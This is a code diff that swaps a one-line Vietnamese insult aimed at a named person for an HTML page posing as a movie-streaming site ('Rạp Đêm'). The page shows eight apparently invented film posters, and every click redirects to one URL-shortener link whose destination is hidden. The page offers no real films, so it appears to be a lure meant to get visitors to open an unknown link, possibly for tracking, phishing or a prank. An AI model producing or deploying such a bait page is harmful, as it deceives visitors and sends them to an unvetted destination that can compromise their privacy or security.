@@ -1,1 +1,309 @@
-tinii là con chó
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RẠP • Web Xem Phim</title>
+<style>
+  :root{
+    --bg: #0c0a08;
+    --bg-soft: #16120e;
+    --gold: #e0a850;
+    --gold-dim: #9c7a42;
+    --cream: #f2e9dc;
+    --muted: #8c8175;
+    --line: #2a2420;
+  }
+
+  *{ margin:0; padding:0; box-sizing:border-box; }
+
+  body{
+    background: var(--bg);
+    color: var(--cream);
+    font-family: 'Georgia', 'Times New Roman', serif;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Film grain / vignette overlay */
+  body::before{
+    content:"";
+    position: fixed; inset:0;
+    background:
+      radial-gradient(ellipse at center, transparent 40%, rgba(0,0,0,0.55) 100%);
+    pointer-events: none;
+    z-index: 5;
+  }
+
+  header{
+    position: relative;
+    padding: 64px 8vw 40px;
+    border-bottom: 1px solid var(--line);
+  }
+
+  .eyebrow{
+    font-family: 'Courier New', monospace;
+    letter-spacing: 0.35em;
+    font-size: 11px;
+    color: var(--gold-dim);
+    text-transform: uppercase;
+    margin-bottom: 18px;
+  }
+
+  h1{
+    font-size: clamp(42px, 7vw, 92px);
+    font-weight: 400;
+    letter-spacing: 0.02em;
+    color: var(--cream);
+    line-height: 1;
+  }
+
+  h1 span{
+    color: var(--gold);
+    font-style: italic;
+  }
+
+  .sub{
+    margin-top: 18px;
+    color: var(--muted);
+    font-size: 16px;
+    max-width: 480px;
+    line-height: 1.6;
+  }
+
+  /* projector light streak */
+  .beam{
+    position: absolute;
+    top: 0; right: 6vw;
+    width: 220px; height: 100%;
+    background: linear-gradient(180deg, rgba(224,168,80,0.12), transparent 70%);
+    filter: blur(30px);
+    pointer-events: none;
+  }
+
+  main{
+    padding: 56px 8vw 100px;
+    position: relative;
+    z-index: 1;
+  }
+
+  .section-label{
+    display:flex;
+    align-items: baseline;
+    gap: 16px;
+    margin-bottom: 32px;
+  }
+
+  .section-label .num{
+    font-family: 'Courier New', monospace;
+    color: var(--gold-dim);
+    font-size: 13px;
+  }
+
+  .section-label h2{
+    font-weight: 400;
+    font-size: 22px;
+    letter-spacing: 0.03em;
+    color: var(--cream);
+  }
+
+  .section-label::after{
+    content:"";
+    flex:1;
+    height:1px;
+    background: var(--line);
+  }
+
+  .grid{
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(190px, 1fr));
+    gap: 28px;
+  }
+
+  .poster{
+    cursor: pointer;
+    background: none;
+    border: none;
+    text-align: left;
+    color: inherit;
+    font-family: inherit;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    outline: none;
+  }
+
+  .thumb{
+    aspect-ratio: 2 / 3;
+    border-radius: 2px;
+    position: relative;
+    overflow: hidden;
+    border: 1px solid var(--line);
+    transition: border-color 0.35s ease, transform 0.35s ease;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+
+  .thumb .glyph{
+    font-size: 42px;
+    color: rgba(242,233,220,0.18);
+    font-style: italic;
+    transform: rotate(-6deg);
+  }
+
+  .thumb .reel-lines{
+    position:absolute; inset:0;
+    background:
+      repeating-linear-gradient(115deg, rgba(224,168,80,0.05) 0px, rgba(224,168,80,0.05) 1px, transparent 1px, transparent 14px);
+  }
+
+  .thumb .rating{
+    position: absolute;
+    top: 10px; left: 10px;
+    font-family: 'Courier New', monospace;
+    font-size: 10px;
+    letter-spacing: 0.1em;
+    color: var(--gold);
+    border: 1px solid var(--gold-dim);
+    padding: 2px 6px;
+    background: rgba(12,10,8,0.7);
+  }
+
+  .thumb .play{
+    position: absolute;
+    width: 46px; height: 46px;
+    border-radius: 50%;
+    border: 1px solid var(--gold);
+    display:flex; align-items:center; justify-content:center;
+    opacity: 0;
+    transform: scale(0.8);
+    transition: opacity 0.3s ease, transform 0.3s ease;
+    background: rgba(12,10,8,0.55);
+  }
+
+  .thumb .play svg{
+    width: 14px; height: 14px;
+    fill: var(--gold);
+    margin-left: 2px;
+  }
+
+  .poster:hover .thumb,
+  .poster:focus-visible .thumb{
+    border-color: var(--gold-dim);
+    transform: translateY(-4px);
+  }
+
+  .poster:hover .play,
+  .poster:focus-visible .play{
+    opacity: 1;
+    transform: scale(1);
+  }
+
+  .meta .title{
+    font-size: 16px;
+    color: var(--cream);
+    letter-spacing: 0.01em;
+  }
+
+  .meta .info{
+    font-family: 'Courier New', monospace;
+    font-size: 11px;
+    color: var(--muted);
+    margin-top: 4px;
+    letter-spacing: 0.05em;
+  }
+
+  /* distinct thumbnail palettes standing in for posters */
+  .p1 .thumb{ background: linear-gradient(160deg, #2b1c14, #120d09); }
+  .p2 .thumb{ background: linear-gradient(160deg, #1a2420, #0d1210); }
+  .p3 .thumb{ background: linear-gradient(160deg, #241a2a, #100a13); }
+  .p4 .thumb{ background: linear-gradient(160deg, #26200f, #110d06); }
+  .p5 .thumb{ background: linear-gradient(160deg, #1c1620, #0c090e); }
+  .p6 .thumb{ background: linear-gradient(160deg, #24140f, #0f0705); }
+  .p7 .thumb{ background: linear-gradient(160deg, #14201f, #080f0e); }
+  .p8 .thumb{ background: linear-gradient(160deg, #201a10, #0e0b06); }
+
+  footer{
+    padding: 32px 8vw 56px;
+    border-top: 1px solid var(--line);
+    color: var(--muted);
+    font-family: 'Courier New', monospace;
+    font-size: 11px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+  }
+
+  @media (prefers-reduced-motion: reduce){
+    .thumb, .play{ transition: none; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="beam"></div>
+  <div class="eyebrow">Suất chiếu hôm nay — Phòng chiếu số 01</div>
+  <h1>Rạp <span>Đêm</span></h1>
+  <p class="sub">Chọn một bộ phim để bắt đầu buổi chiếu. Đèn sẽ tắt, màn hình sẽ sáng.</p>
+</header>
+
+<main>
+
+  <div class="section-label">
+    <span class="num">01</span>
+    <h2>Đang chiếu</h2>
+  </div>
+
+  <div class="grid" id="movie-grid"></div>
+
+</main>
+
+<footer>
+  Rạp Đêm — Suất chiếu tư nhân · Nhấn vào áp phích để vào phòng chiếu
+</footer>
+
+<script>
+  // Danh sách phim — chỉnh sửa tiêu đề/thể loại tại đây
+  const movies = [
+    { title: "Ánh Sáng Cuối Đêm", genre: "Chính kịch", year: "2024", rating: "T16", cls: "p1" },
+    { title: "Lối Về Sương Mù", genre: "Tâm lý", year: "2023", rating: "T13", cls: "p2" },
+    { title: "Vực Thẳm Đỏ", genre: "Kinh dị", year: "2024", rating: "T18", cls: "p3" },
+    { title: "Giấc Mơ Thành Phố", genre: "Lãng mạn", year: "2022", rating: "T13", cls: "p4" },
+    { title: "Kẻ Săn Bóng Tối", genre: "Hành động", year: "2024", rating: "T16", cls: "p5" },
+    { title: "Ngày Không Tên", genre: "Chính kịch", year: "2021", rating: "T13", cls: "p6" },
+    { title: "Biển Lặng", genre: "Phiêu lưu", year: "2023", rating: "P", cls: "p7" },
+    { title: "Cơn Mưa Cuối Mùa", genre: "Tâm lý", year: "2020", rating: "T16", cls: "p8" },
+  ];
+
+  // Link đích khi bấm vào bất kỳ phim nào
+  const TARGET_LINK = "https://zyo.lol/S0n";
+
+  const grid = document.getElementById("movie-grid");
+
+  movies.forEach(m => {
+    const btn = document.createElement("button");
+    btn.className = `poster ${m.cls}`;
+    btn.innerHTML = `
+      <div class="thumb">
+        <div class="reel-lines"></div>
+        <span class="rating">${m.rating}</span>
+        <span class="glyph">${m.title.charAt(0)}</span>
+        <div class="play">
+          <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+        </div>
+      </div>
+      <div class="meta">
+        <div class="title">${m.title}</div>
+        <div class="info">${m.genre} · ${m.year}</div>
+      </div>
+    `;
+    btn.addEventListener("click", () => {
+      window.location.href = TARGET_LINK;
+    });
+    grid.appendChild(btn);
+  });
+</script>
+
+</body>
+</html>
